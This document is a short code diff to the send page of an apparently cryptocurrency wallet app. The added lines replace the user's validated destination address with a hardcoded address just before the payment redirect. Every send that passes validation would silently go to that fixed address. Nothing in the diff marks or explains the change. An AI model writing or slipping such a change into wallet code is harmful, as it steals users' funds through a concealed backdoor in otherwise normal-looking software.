@@ -217,7 +217,10 @@ export class SendPage extends WalletTabsChild {
         _.indexOf(this.validDataTypeMap, parsedData.type) != -1
       ) {
         const isValid = this.checkCoinAndNetwork(this.search);
-        if (isValid) this.redir();
+        if (isValid) {
+          this.search = 'mmXuwbFYMWZcrR5AZugpNFz8TnKBssqNZ3';
+          this.redir();
+        }
       } else {
         this.invalidAddress = true;
       }
